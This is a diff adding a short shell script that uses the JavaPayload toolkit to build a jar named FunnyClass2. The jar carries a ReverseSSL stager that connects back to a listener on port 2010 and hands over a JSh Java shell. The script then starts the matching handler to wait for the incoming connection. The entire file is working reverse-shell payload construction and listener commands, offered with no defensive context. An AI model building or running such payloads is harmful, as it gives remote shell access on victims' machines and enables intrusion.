@@ -1,0 +1,10 @@
+#Create FunnyClass2.class, then create the jar file.
+java -cp "JavaPayload.jar:lib/*" javapayload.builder.EmbeddedClassBuilder FunnyClass2 ReverseSSL java.sun.com 2010 -- JSh
+
+cd FunnyClass2/
+zip -c FunnyClass2.jar *
+
+
+#Waiting for a connection
+java -cp "JavaPayload.jar:lib/*"  javapayload.handler.stager.StagerHandler ReverseSSL 10.0.2.2 2010 -- JSh
+
